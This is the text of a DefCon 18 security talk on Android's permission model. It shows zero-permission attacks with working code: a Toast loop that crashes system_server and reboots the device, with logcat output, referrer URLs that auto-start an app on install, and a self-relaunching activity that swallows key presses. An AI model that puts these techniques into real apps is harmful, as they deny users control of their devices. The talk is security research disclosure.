THESE AREN’T THE 
PERMISSIONS YOU’RE 
LOOKING FOR
Anthony Lineberry
David Luke Richardson
Tim Wyatt
DefCon 18
AGENDA
• Android Internals Overview
• Security/Permission Model
• Why Ask For Permission When You
Can Ask For Forgiveness?
• Log-Cat – Our Inside Mole
• The Ultimate Permission 
(Yes, we’re talking about root)
• Mitigation
ANDROID INTERNALS
Diving Into the Belly of the Beast
ANDROID MANIFEST
• AndroidManifest.xml – Every application must have one
• Declares the package name, a unique identiﬁer for every app
• Describes applications components (Activities, Services, 
BroadcastReceivers, etc)
• Declares requested permissions “needed” to access protected 
API’s (If only there were a way to get around that...)
• Declares permissions other applications are required to have 
to interact with applications components
ACTIVITY
• A way for users to interact with
the application
• Composed of  Views:
• Button
• TextView
• ImageView
• etc...
ACTIVITY
• Managed as an Activity stack
• New/foreground activity on top of stack. In running/active state
• Previous Activities below in paused state
• Removed from stack when Activity ﬁnishes
ACTIVITY
• An application can start another application’s Activity!
• Activity runs in its application’s process. 
• Callee doesn’t necessarily have access to Activity’s data
• Permission attribute in manifest can restrict who can start the 
permission
INTENT
• “An abstract description of an 
operation to be performed”
• Simple IPC for applications
• Intents can be sent with data
INTENT
• Can be used to start an Activity with startActivity()
• Intents can be broadcast system wide with sendBroadcast()
• Communicate with a background Service
• Two main components:
• Action
• Data (URI: http:, content:, geo:, etc...)
Intent myIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("http://www.google.com")); 
startActivity(myIntent);
BROADCAST RECEIVER
• Receives an Intent
• Can be created dynamically with registerBroadcast() or 
declared in the manifest with the  tag
• Receives two types of broadcasts:
• Normal Broadcasts – Asynchronous; Cannot be aborted
• Ordered Broadcasts – Delivered serially; Can be aborted or 
pass result to next receiver
BROADCAST RECEIVER
• Permissions can be enforced
• Sender can declare permission 
for who can receive the Intent
• Receiver can declare permission
for who can send an Intent to it
SERVICE
• Component to do work in the background
• NOT a separate process
• NOT a thread
• Kind of like an Activity without a UI 
• Can enforce access to service with a required permission
SECURITY/PERMISSION 
MODEL
The Mythical Sandbox
THE SANDBOX
• Not a VM sandbox as many believe
• Unix multi-user (uid/gid) sandbox!
• Each app is a different uid
• Lightweight VM running for each process
• Breaking out of the VM gains you nothing
• Apps can request to share a uid (Both must be signed with 
the same key)
PERMISSIONS
• Default application has no permissions granted
• Finer grained access to content/APIs
• android.permission.READ_SMS
• android.permission.CHANGE_WIFI_STATE
• etc..
• Declared in AndroidManifest.xml
WHY ASK FOR PERMISSION 
WHEN YOU CAN ASK FOR 
FORGIVENESS?
WHY PERMISSIONS MATTER
• Permissions gate what an 
App can do
• Users are required to OK 
permissions before 
downloading an App
• Users can decipher to some 
degree whether permissions 
are appropriate
WHY PERMISSIONS MATTER
WHY PERMISSIONS MATTER
VS
WHAT DOES 0 PERMISSIONS 
MEAN?
• No permission screen at all!
• Straight to download
• Why should a user worry 
about an App Android 
doesn’t warn about?
REBOOT
WITH 0 PERMISSIONS
• REBOOT permission is not normally grantable to apps.
• Requires SystemOrSignature
• But that won’t stop us!
• There are many approaches 
depending on Android OS 
Version
• The easiest and most 
reliable we’ve found so far 
involves Toast notiﬁcations
REBOOT
WITH 0 PERMISSIONS
• Every time you try to display a Toast it creates a 
weak JNI reference in system_server
while (true) {
    Toast.makeText(getApplicationContext(), "Hello World", Toast.LENGTH_LONG).show();
}
REBOOT
WITH 0 PERMISSIONS
D/dalvikvm(   59): GREF has increased to 2001
W/dalvikvm(   59): Last 10 entries in JNI global reference table:
W/dalvikvm(   59):  1991: 0x44023668 cls=Ljava/lang/ref/WeakReference; (28 bytes)
...
W/dalvikvm(   59):  2000: 0x44019818 cls=Ljava/lang/ref/WeakReference; (36 bytes)
W/dalvikvm(   59): JNI global reference table summary (2001 entries):
W/dalvikvm(   59):   101 of Ljava/lang/Class; 164B (54 unique)
W/dalvikvm(   59):     2 of Ldalvik/system/VMRuntime; 12B (1 unique)
W/dalvikvm(   59):     1 of Ljava/lang/String; 28B
W/dalvikvm(   59):  1571 of Ljava/lang/ref/WeakReference; 28B (1571 unique)
...
W/dalvikvm(   59): Memory held directly by tracked refs is 70248 bytes
E/dalvikvm(   59): Excessive JNI global references (2001)
E/dalvikvm(   59): VM aborting
I/DEBUG   (   31): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
I/DEBUG   (   31): Build ﬁngerprint: 'generic/google_sdk/generic/:2.2/FRF42/36942:eng/test-keys'
I/DEBUG   (   31): pid: 59, tid: 218  >>> system_server 
    -->
START ON INSTALL
WITH 0 PERMISSIONS
• Interesting trick to use in conjunction with another attack
• No permission exists to allow this functionality
• Google Analytics referrer tracking to the rescue!
START ON INSTALL
WITH 0 PERMISSIONS
• Just write your own Receiver
• But there are some caveats...
START ON INSTALL
WITH 0 PERMISSIONS
• Requires referrer included in URL leading to App
• Admob
• Weblink
• OR Android 2.2
• Always includes referrer info
market://details?id=com.nethack&referrer=utm_source%3Dadmob
%26utm_medium%3Dbanner%26utm_term%3Darcade%252Bgame
%26utm_campaign%3DMalicious_Campaign
market://details?id=com.nethack&referrer=autostart
market://details?
id=com.nethack&referrer=utm_source=androidmarket&utm_medium=devic
e&
utm_campaign=ﬁltered&utm_content=GAMES/free&rowindex=34
CIRCLE OF DEATH 
UI HOSTILE TAKEOVER WITH 0 PERMISSIONS
• Launch activity that 
consumes all KeyPresses
• Can’t swallow HOME or 
long press of HOME
• Relaunch when Activity exits
• Activity can’t launch itself 
when destroyed, however
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        return true;
    }
• So create a circle of death
• When Activity is destroyed, launch a Service. 
Service relaunches destroyed Activity
    // RestartService
    public void onCreate() {
        super.onCreate();
        startActivity(new Intent(getApplicationContext(), MaliciousActivity.class)
                      .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
    }